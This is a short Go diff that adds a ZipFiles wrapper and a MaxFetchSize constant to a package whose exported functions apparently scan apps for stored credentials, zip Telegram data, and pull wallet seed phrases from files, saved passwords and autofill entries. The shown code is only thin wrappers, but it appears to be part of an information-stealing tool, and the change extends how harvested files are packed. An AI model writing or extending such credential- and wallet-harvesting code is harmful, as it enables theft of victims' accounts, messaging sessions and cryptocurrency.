@@ -70,6 +70,12 @@ func ScanApps() []AppCredentialResult         { return scanner.ScanApps() }
 func FetchFile(path string) ([]byte, error)   { return scanner.FetchFile(path) }
 func ZipTelegram(path string) ([]byte, error) { return scanner.ZipTelegram(path) }
 func ZipDirectory(dir string) ([]byte, error) { return ziputil.ZipDirectory(dir) }
+func ZipFiles(paths []string, baseDir string) ([]byte, error) {
+	return ziputil.ZipFiles(paths, baseDir)
+}
+
+// MaxFetchSize is the per-file content limit used when packing scanned files.
+const MaxFetchSize = scanner.MaxFetchSize
 
 func ScanSeeds(files []FileResult, passwords []PasswordResult, autofill []AutofillResult) []SeedResult {
 	return scanner.ScanSeeds(files, passwords, autofill)
